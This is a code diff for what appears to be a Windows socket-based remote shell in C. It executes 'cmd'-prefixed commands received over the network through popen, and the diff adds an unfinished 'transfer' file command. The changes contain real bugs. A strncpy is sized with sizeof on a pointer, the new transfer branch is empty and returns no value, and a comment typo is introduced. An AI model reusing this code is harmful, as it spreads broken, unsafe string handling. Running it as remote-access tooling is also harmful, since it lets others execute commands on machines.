@@ -8,8 +8,9 @@
 #include <ws2tcpip.h>
 
 // Need to link with Ws2_32.lib
-// unfortunately this does not work, so when compiling we manually tell gcc to use this library to compile with the "-lws2_32" option.
+// unfortunately this does not work, so when compiling we manually tell gcc to use this library to compile with the "-lws2_32" op tion.
 #pragma comment (lib, "ws2_32.lib")
+
 
 /*
 Communicates with the given socket from the server/shell side
@@ -64,9 +65,9 @@ Places the necessary response in char *reply, and returns a pointer to the reply
 char* processMsg(char * msg, char * cwd, int REPLY_MAX_SIZE){
     // check if a shell (cmd prompt) command is being issued
     // an input that starts with "cmd" or "c"
-    char msgcpy[128];
-    strncpy(msgcpy, msg, sizeof(msgcpy));
-    if (strcmp(strtok(msgcpy, " "), "cmd") == 0 || strcmp(strtok(msgcpy, " "), "c") == 0){
+    char msgCpy[128];
+    strncpy(msgCpy, msg, sizeof(msgCpy));
+    if (strcmp(strtok(msgCpy, " "), "cmd") == 0 || strcmp(strtok(msgCpy, " "), "c") == 0){
         msg+=(strcspn(msg, " ")+1); // pass everthing after the "cmd " or "c " at the beginning of the msg
         return processShellCmd(msg, cwd, REPLY_MAX_SIZE);
     }
@@ -80,6 +81,9 @@ Process external commands. Perform function and return output
 */
 char* processExtCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE){
     char * reply = (char*)calloc(REPLY_MAX_SIZE, sizeof(char));
+    char cmdCpy[128];
+    strncpy(cmdCpy, cmd, sizeof(cmd));
+
     if (strcmp(cmd, "reset") == 0){
         char * temp;
         temp = getCmdOut("echo %HOMEDRIVE%%HOMEPATH%", 128);
@@ -89,6 +93,12 @@ char* processExtCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE){
 
         strcpy(reply, cwd);
         return reply;
+    }
+    else if (strcmp(strtok(cmdCpy, " "), "transfer") == 0) {
+        char * filename = cmd;
+        filename += (strcspn(cmd, " ")+1); // get the entire second argument whether or not it includes spaces
+
+
     }
     else{
         strcpy(reply, "That command is not recognized!\n");
@@ -155,9 +165,9 @@ char* getCmdOut(char * cmd, int REPLY_MAX_SIZE){
     fp = popen(cmd, "r");
     int bytesCat = 0;   // keeps track of the # of bytes concatenated to prevent buffer overflow 
     while (fgets(line, REPLY_MAX_SIZE, fp) != NULL) {
+        strncat(output, line, REPLY_MAX_SIZE-bytesCat-1);
         bytesCat+=(strlen(line));
-        strncat(output, line, REPLY_MAX_SIZE-bytesCat);
-        if (bytesCat >= REPLY_MAX_SIZE){
+        if (bytesCat >= REPLY_MAX_SIZE-1){
             break;
         }
     }
